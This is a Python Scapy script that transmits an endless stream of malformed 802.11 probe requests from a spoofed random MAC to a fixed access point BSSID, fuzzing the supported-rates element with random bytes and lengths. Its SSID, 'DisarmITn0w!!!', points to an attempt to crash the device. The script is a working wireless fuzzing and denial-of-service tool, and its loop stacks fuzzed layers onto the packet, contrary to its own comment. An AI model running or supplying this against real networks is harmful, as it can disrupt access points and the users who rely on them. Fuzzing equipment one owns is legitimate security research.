#!/usr/bin/python
# -*- coding: utf-8 -*-​
import sys,logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

station = RandMAC()
bssid = '00:40:96:01:02:03'
conf.iface = 'mon0'
apssid = 'DisarmITn0w!!!'

# Standard 802.11 Probe Request frame to use as base packet
essid = Dot11Elt(ID=0,info=apssid, len=len(apssid))
channel = Dot11Elt(ID=3, len=1, info="\x01")  ## IE channel 1
wps = Dot11Elt(ID=221,len=9,info="\x00\x50\xF2\x04\x10\x4a\x00\x01\x10")
dsset = Dot11Elt(ID='DSset',info='\x01')

basepkt =  RadioTap()
basepkt /= Dot11(type=0,subtype=4,addr1=bssid,addr2=station,addr3=bssid,FCfield=0,SC=0,ID=0)
basepkt /= Dot11ProbeReq()/essid/channel/wps/dsset

while 1:
	# Fuzz on the supported rates element IE, using base packet
	# Changes the supported rates after 20 packets
	basepkt /= fuzz(Dot11Elt(ID=3,info=RandByte(),len=RandByte()))

	# Send a packet every 1/10th of a second, 20 times
	sendp(basepkt, count=20, inter=0.100)
